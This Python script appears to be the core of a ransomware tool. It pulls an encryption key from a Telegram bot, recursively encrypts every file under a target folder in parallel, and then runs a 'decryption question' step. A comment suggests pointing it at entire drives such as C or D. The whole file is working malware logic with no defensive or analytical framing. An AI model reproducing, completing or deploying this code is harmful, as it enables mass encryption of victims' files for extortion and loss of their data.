import os
import random
import time
from datetime import datetime
from Get_Key import key
from encrypted_code import encrypt_file_inplace, encrypt_files_parallel
from cryptography.fernet import Fernet
from decrypted_code import start_decryption

TARGET_FOLDER = r"D:\11"  # test Folder example can be list of [C , D , G , J , E , G ] others ..

os.makedirs("logs", exist_ok=True)
log_file_path = "logs/logs.txt"


def log(msg):
    print(msg)
    with open(log_file_path, "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} - {msg}\n")


log("Waiting for encryption key from Telegram Bot ...")
encryption_key = key()
fernet = Fernet(encryption_key.encode())
log(f"Key received: {encryption_key[:10]}...")  # Can be Hided for security or deleted

file_list = []
if os.path.isfile(TARGET_FOLDER):
    file_list.append(TARGET_FOLDER)
elif os.path.isdir(TARGET_FOLDER):
    for root, dirs, files in os.walk(TARGET_FOLDER):
        for f in files:
            file_list.append(os.path.join(root, f))
else:
    raise ValueError("Target path does not exist!")

log(f"Total files to encrypt: {len(file_list)}")

start_time = datetime.now()
log("Encryption started at:")

encrypt_files_parallel(file_list, fernet)

end_time = datetime.now()
log("Encryption finished at:")
log("Elapsed time:", )
log(f"Check :{TARGET_FOLDER}")

time.sleep(random.randint(1, 6))

log("Executing Decryption Question ...")
start_decryption(file_list)
